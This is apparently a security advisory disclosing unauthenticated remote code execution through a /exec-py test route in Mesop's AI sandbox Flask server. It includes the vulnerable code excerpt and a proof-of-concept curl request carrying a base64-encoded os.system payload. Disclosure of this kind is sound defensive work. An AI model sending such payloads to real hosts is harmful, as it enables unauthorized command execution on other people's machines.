summary: Mesop Affected by Unauthenticated Remote Code Execution via Test Suite Route
  /exec-py
details: "#### Summary\nAn explicit web endpoint inside the `ai/` testing module infrastructure
  directly ingests untrusted Python code strings unconditionally without authentication
  measures, yielding standard Unrestricted Remote Code Execution. Any individual capable
  of routing HTTP logic to this server block will gain explicit host-machine command
  rights.\n\n#### Details\nThe AI codebase package includes a lightweight debugging
  Flask server inside `ai/sandbox/wsgi_app.py`. The `/exec-py` route accepts base_64
  encoded raw string payloads inside the `code` parameter natively evaluated by a
  basic `POST` web request. It saves it rapidly to the operating system logic path
  and injects it recursively using `execute_module(module_path...)`.\n\n```python\n
  # ai/sandbox/wsgi_app.py\n@flask_app.route(\"/exec-py\", methods=[\"POST\"])\ndef
  exec_py_route():\n  code = base64.urlsafe_b64decode(request.form.get(\"code\"))\n\
  \  # ... code is blindly written to file and forcefully executed\n```\n\n#### PoC\n
  ```bash\n# Payload:\n# import os\n# os.system('echo \"pwned by attacker\" > /tmp/pwned.txt')\n
  # \n# Base64 string represents the identical payload block above: \n# aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ==\n
  \ncurl -X POST http://<target_ip_address_hosting_sandbox>:port/exec-py \\\n  -H
  \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"code=aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ==\"\
  \n\n# Validate exploitation target execution natively:\n# $ cat /tmp/pwned.txt\n
  # pwned by attacker\n```\n\n#### Impact\nThis presents trivial severity for systems
  publicly exposed or lacking strictly verified boundary firewalls due to absolute
  unauthenticated command injection privileges targeting the direct execution interpreter
  running this service sandbox."
